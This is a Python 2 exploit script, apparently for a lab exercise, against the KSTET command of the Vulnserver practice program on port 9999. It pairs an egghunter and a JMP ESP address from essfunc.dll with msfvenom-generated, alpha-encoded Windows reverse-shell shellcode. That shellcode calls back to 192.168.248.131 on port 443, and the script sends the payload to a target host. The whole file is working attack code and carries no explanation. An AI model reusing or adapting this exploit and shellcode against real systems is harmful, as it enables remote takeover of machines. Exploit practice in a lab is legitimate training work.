import socket
import os
import sys
from subprocess import Popen,PIPE
import struct

def p32(addr):
	return struct.pack("<I",addr)

# ntA
# KSTET buffer overflow
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x50\x57\x4e\x44\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.248.131 LPORT=443 -f raw EXITFUNC=thread|/opt/metasploit/apps/pro/msf3/msfencode -e x86/alpha_mixed BufferRegister=EDI

shellcode = (
"PWNDPWND"
"\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42"
"\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x39\x6c\x48\x68"
"\x4b\x39\x75\x50\x73\x30\x53\x30\x53\x50\x6f\x79\x4a\x45"
"\x34\x71\x48\x52\x65\x34\x4e\x6b\x62\x72\x30\x30\x4e\x6b"
"\x36\x32\x46\x6c\x6c\x4b\x31\x42\x37\x64\x4e\x6b\x32\x52"
"\x46\x48\x66\x6f\x6d\x67\x72\x6a\x57\x56\x34\x71\x4b\x4f"
"\x45\x61\x4b\x70\x6e\x4c\x37\x4c\x63\x51\x43\x4c\x76\x62"
"\x64\x6c\x55\x70\x59\x51\x48\x4f\x44\x4d\x55\x51\x38\x47"
"\x6b\x52\x68\x70\x50\x52\x73\x67\x4c\x4b\x72\x72\x66\x70"
"\x4c\x4b\x61\x52\x45\x6c\x57\x71\x68\x50\x4c\x4b\x47\x30"
"\x63\x48\x6f\x75\x59\x50\x43\x44\x70\x4a\x45\x51\x6a\x70"
"\x70\x50\x4e\x6b\x52\x68\x32\x38\x6c\x4b\x31\x48\x61\x30"
"\x36\x61\x6a\x73\x6a\x43\x45\x6c\x47\x39\x6e\x6b\x36\x54"
"\x4e\x6b\x46\x61\x6b\x66\x56\x51\x79\x6f\x46\x51\x6b\x70"
"\x4c\x6c\x6a\x61\x78\x4f\x74\x4d\x46\x61\x4b\x77\x45\x68"
"\x6b\x50\x64\x35\x68\x74\x65\x53\x33\x4d\x58\x78\x47\x4b"
"\x51\x6d\x64\x64\x50\x75\x6b\x52\x46\x38\x6e\x6b\x42\x78"
"\x54\x64\x56\x61\x78\x53\x75\x36\x6c\x4b\x44\x4c\x70\x4b"
"\x6e\x6b\x56\x38\x75\x4c\x65\x51\x59\x43\x6e\x6b\x43\x34"
"\x4e\x6b\x37\x71\x6a\x70\x6f\x79\x43\x74\x35\x74\x74\x64"
"\x53\x6b\x73\x6b\x35\x31\x70\x59\x32\x7a\x42\x71\x6b\x4f"
"\x6b\x50\x52\x78\x73\x6f\x43\x6a\x6e\x6b\x57\x62\x78\x6b"
"\x6b\x36\x43\x6d\x55\x38\x44\x73\x75\x62\x37\x70\x67\x70"
"\x55\x38\x31\x67\x70\x73\x45\x62\x43\x6f\x52\x74\x61\x78"
"\x32\x6c\x50\x77\x54\x66\x34\x47\x49\x6f\x6b\x65\x78\x38"
"\x5a\x30\x76\x61\x77\x70\x73\x30\x66\x49\x38\x44\x50\x54"
"\x30\x50\x45\x38\x61\x39\x4f\x70\x52\x4b\x43\x30\x59\x6f"
"\x4b\x65\x72\x70\x32\x70\x46\x30\x46\x30\x47\x30\x56\x30"
"\x33\x70\x52\x70\x51\x78\x68\x6a\x36\x6f\x49\x4f\x4d\x30"
"\x49\x6f\x69\x45\x4b\x39\x68\x47\x73\x58\x39\x50\x4d\x78"
"\x68\x78\x6c\x43\x75\x38\x34\x42\x55\x50\x73\x31\x4d\x6b"
"\x4f\x79\x7a\x46\x73\x5a\x64\x50\x73\x66\x33\x67\x43\x58"
"\x6e\x79\x4d\x75\x62\x54\x71\x71\x59\x6f\x4a\x75\x31\x78"
"\x70\x63\x62\x4d\x65\x34\x73\x30\x4c\x49\x4a\x43\x53\x67"
"\x61\x47\x42\x77\x75\x61\x38\x76\x70\x6a\x34\x52\x56\x39"
"\x73\x66\x49\x72\x59\x6d\x43\x56\x5a\x67\x53\x74\x65\x74"
"\x47\x4c\x65\x51\x76\x61\x4e\x6d\x42\x64\x47\x54\x32\x30"
"\x6f\x36\x63\x30\x67\x34\x51\x44\x42\x70\x50\x56\x70\x56"
"\x31\x46\x47\x36\x36\x36\x62\x6e\x51\x46\x56\x36\x61\x43"
"\x46\x36\x71\x78\x52\x59\x38\x4c\x77\x4f\x6b\x36\x49\x6f"
"\x59\x45\x6c\x49\x69\x70\x72\x6e\x50\x56\x50\x46\x6b\x4f"
"\x76\x50\x33\x58\x54\x48\x6d\x57\x55\x4d\x43\x50\x49\x6f"
"\x78\x55\x6d\x6b\x69\x70\x65\x4d\x74\x6a\x34\x4a\x43\x58"
"\x6c\x66\x6a\x35\x4f\x4d\x6f\x6d\x59\x6f\x39\x45\x65\x6c"
"\x67\x76\x71\x6c\x76\x6a\x6d\x50\x69\x6b\x4d\x30\x54\x35"
"\x34\x45\x6d\x6b\x61\x57\x46\x73\x30\x72\x72\x4f\x51\x7a"
"\x55\x50\x50\x53\x4b\x4f\x78\x55\x41\x41"
)

jmp_esp = p32(0x62501203) # essfunc.dll

payload = [
			"GDOG %s\n" %(shellcode),
			"KSTET %s\n" %(egghunter+'\x90'*38+jmp_esp+'\x7A\xB4'+'C'*(30))
		]

host = "192.168.248.130"
port = 9999



def line_send_tcp(host,port,payload_list = [],recv_first=None):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,int(port)))
	if len(payload_list):
		if recv_first:
			print s.recv(1024)
		for i in payload_list:
			s.send(i)
			print s.recv(1024)
	s.close()




line_send_tcp(host,port,payload_list=payload,recv_first=True)